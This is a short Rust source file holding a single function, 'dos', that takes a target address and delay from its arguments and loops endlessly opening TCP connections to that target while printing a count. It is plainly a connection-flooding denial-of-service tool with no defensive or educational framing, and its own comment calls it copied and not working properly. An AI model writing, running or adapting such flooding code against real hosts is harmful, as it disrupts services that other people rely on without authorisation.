use std::io;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

// copied from somewhere - not working properly
pub fn dos(args: Vec<String>) {
    let mut args = args;
    args.remove(0);

    let mut time: u64 = 0;
    let sleep = Duration::from_millis(args[1].parse::<u64>().unwrap_or(0));

    let target = &args[0];

    loop {
        time += 1;
        TcpStream::connect(target.to_owned()).unwrap();
        print!("\r{}", time);
        io::stdout().flush().ok().expect("Could not flush stdout");
        thread::sleep(sleep);
    }
}
